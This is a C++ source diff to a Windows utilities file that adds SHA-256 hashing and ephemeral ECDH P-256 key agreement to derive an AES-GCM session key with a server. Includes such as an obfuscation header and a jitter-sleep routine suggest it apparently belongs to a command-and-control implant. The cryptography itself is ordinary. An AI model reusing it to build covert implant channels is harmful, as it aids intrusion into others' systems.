@@ -1,14 +1,16 @@
-// utils.cpp — String conversion, Base64, XOR, AES-GCM (BCrypt), hardware key
-// derivation, system info, jitter sleep.
+// utils.cpp — String conversion, Base64, AES-GCM + ECDH P-256 (BCrypt),
+// SHA-256, system info, jitter sleep.
 #include "utils.hpp"
 #include "obfuscate.hpp"
 #include <windows.h>
 #include <bcrypt.h>
+#include <wincrypt.h>
 #include <winternl.h>
 #include <sstream>
 #include <iomanip>
 #include <random>
 #include <chrono>
+#include <algorithm>
 #include <lmcons.h>
 
 #ifdef _MSC_VER
@@ -213,6 +215,141 @@ std::string AesGcmDecrypt(const std::vector<BYTE>& key,
 
     if (!BCRYPT_SUCCESS(st)) return {};
     return std::string(reinterpret_cast<char*>(plain.data()), cbResult);
+}
+
+// ---------------------------------------------------------------------------
+// SHA-256 over raw bytes
+// ---------------------------------------------------------------------------
+
+std::vector<BYTE> Sha256Bytes(const BYTE* data, size_t len) {
+    std::vector<BYTE> out(32, 0);
+    HCRYPTPROV hProv = 0;
+    HCRYPTHASH hHash = 0;
+    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES,
+                              CRYPT_VERIFYCONTEXT))
+        return out;
+    if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+        CryptHashData(hHash, const_cast<BYTE*>(data),
+                      static_cast<DWORD>(len), 0);
+        DWORD cb = 32;
+        CryptGetHashParam(hHash, HP_HASHVAL, out.data(), &cb, 0);
+        CryptDestroyHash(hHash);
+    }
+    CryptReleaseContext(hProv, 0);
+    return out;
+}
+
+// ---------------------------------------------------------------------------
+// Ephemeral ECDH P-256 key agreement (BCrypt)
+//   Wire format: Base64( X[32] || Y[32] ), both coordinates big-endian —
+//   the standard uncompressed-point encoding minus the 0x04 prefix. BCrypt
+//   ECCKEY blobs store the coordinates little-endian, so each 32-byte half
+//   is reversed on the way in and out. BCRYPT_KDF_RAW_SECRET ("TRUNCATE")
+//   returns the shared secret little-endian; it is reversed before hashing
+//   so both sides hash identical big-endian bytes.
+// ---------------------------------------------------------------------------
+
+static BOOL              g_EcdhReady = FALSE;
+static BCRYPT_ALG_HANDLE g_EcdhAlg   = nullptr;
+static BCRYPT_KEY_HANDLE g_EcdhPriv  = nullptr;
+static std::string       g_EcdhPubB64;
+
+static void Rev32(BYTE* p) {
+    for (int i = 0; i < 16; ++i) std::swap(p[i], p[31 - i]);
+}
+
+BOOL EcdhInit() {
+    if (g_EcdhReady) return TRUE;
+
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
+            &g_EcdhAlg, L"ECDH_P256", nullptr, 0)))
+        return FALSE;
+
+    if (!BCRYPT_SUCCESS(BCryptGenerateKeyPair(g_EcdhAlg, &g_EcdhPriv, 256, 0)) ||
+        !BCRYPT_SUCCESS(BCryptFinalizeKeyPair(g_EcdhPriv, 0))) {
+        BCryptCloseAlgorithmProvider(g_EcdhAlg, 0);
+        g_EcdhAlg = nullptr;
+        return FALSE;
+    }
+
+    ULONG cb = 0;
+    if (!BCRYPT_SUCCESS(BCryptExportKey(g_EcdhPriv, nullptr,
+                                        BCRYPT_ECDH_PUBLIC_BLOB,
+                                        nullptr, 0, &cb, 0)) ||
+        cb < sizeof(BCRYPT_ECCKEY_BLOB) + 64) {
+        BCryptDestroyKey(g_EcdhPriv);
+        BCryptCloseAlgorithmProvider(g_EcdhAlg, 0);
+        g_EcdhPriv = nullptr; g_EcdhAlg = nullptr;
+        return FALSE;
+    }
+
+    std::vector<BYTE> blob(cb);
+    if (!BCRYPT_SUCCESS(BCryptExportKey(g_EcdhPriv, nullptr,
+                                        BCRYPT_ECDH_PUBLIC_BLOB,
+                                        blob.data(), cb, &cb, 0))) {
+        BCryptDestroyKey(g_EcdhPriv);
+        BCryptCloseAlgorithmProvider(g_EcdhAlg, 0);
+        g_EcdhPriv = nullptr; g_EcdhAlg = nullptr;
+        return FALSE;
+    }
+
+    // Blob: BCRYPT_ECCKEY_BLOB header + X(32, LE) + Y(32, LE)
+    BYTE* xy = blob.data() + sizeof(BCRYPT_ECCKEY_BLOB);
+    Rev32(xy);
+    Rev32(xy + 32);                 // LE (BCrypt) → BE (wire)
+    g_EcdhPubB64 = Base64Encode(xy, 64);
+    g_EcdhReady  = TRUE;
+    return TRUE;
+}
+
+std::string EcdhPublicKeyB64() {
+    if (!g_EcdhReady) EcdhInit();
+    return g_EcdhPubB64;
+}
+
+BOOL EcdhDeriveSessionKey(const std::string& serverPubB64,
+                          std::vector<BYTE>& key32) {
+    key32.clear();
+    if (!g_EcdhReady && !EcdhInit()) return FALSE;
+
+    std::vector<BYTE> xy = Base64Decode(serverPubB64);
+    if (xy.size() != 64) return FALSE;
+    Rev32(xy.data());
+    Rev32(xy.data() + 32);          // BE (wire) → LE (BCrypt)
+
+    std::vector<BYTE> blob(sizeof(BCRYPT_ECCKEY_BLOB) + 64);
+    auto* hdr = reinterpret_cast<BCRYPT_ECCKEY_BLOB*>(blob.data());
+    hdr->dwMagic = 0x314B4345;      // BCRYPT_ECDH_PUBLIC_P256_MAGIC
+    hdr->cbKey   = 32;
+    memcpy(blob.data() + sizeof(BCRYPT_ECCKEY_BLOB), xy.data(), 64);
+
+    BCRYPT_KEY_HANDLE hPub = nullptr;
+    if (!BCRYPT_SUCCESS(BCryptImportKeyPair(g_EcdhAlg, nullptr,
+                                            BCRYPT_ECDH_PUBLIC_BLOB, &hPub,
+                                            blob.data(),
+                                            static_cast<ULONG>(blob.size()), 0)))
+        return FALSE;
+
+    BCRYPT_SECRET_HANDLE hSecret = nullptr;
+    NTSTATUS st = BCryptSecretAgreement(g_EcdhPriv, hPub, &hSecret, 0);
+    BCryptDestroyKey(hPub);
+    if (!BCRYPT_SUCCESS(st)) return FALSE;
+
+    ULONG cbSecret = 0;
+    st = BCryptDeriveKey(hSecret, L"TRUNCATE", nullptr, 0, nullptr, 0, &cbSecret);
+    if (BCRYPT_SUCCESS(st) && cbSecret == 32) {
+        std::vector<BYTE> raw(32);
+        ULONG cbOut = 0;
+        st = BCryptDeriveKey(hSecret, L"TRUNCATE", nullptr, 0,
+                             raw.data(), 32, &cbOut);
+        BCryptDestroySecret(hSecret);
+        if (!BCRYPT_SUCCESS(st) || cbOut != 32) return FALSE;
+        Rev32(raw.data());          // LE (BCrypt) → BE (matches server)
+        key32 = Sha256Bytes(raw.data(), raw.size());
+        return key32.size() == 32 ? TRUE : FALSE;
+    }
+    BCryptDestroySecret(hSecret);
+    return FALSE;
 }
 
 // ---------------------------------------------------------------------------
